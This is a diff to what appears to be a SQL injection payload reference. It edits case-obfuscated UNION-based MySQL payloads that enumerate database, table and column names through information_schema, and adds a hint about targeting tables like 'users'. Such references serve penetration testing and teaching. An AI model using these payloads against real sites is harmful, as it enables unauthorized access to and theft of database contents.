@@ -16,7 +16,7 @@
 
 Database names:
 ```text
--1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
+-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
 ```
 
 Tables of a database:
@@ -25,7 +25,7 @@ Tables of a database:
 -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
 ```
 
-Column names:
+Column names (with for example `table_name=accounts` or `table_name=users`, depending on tables found):
 ```text
 -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
 ```
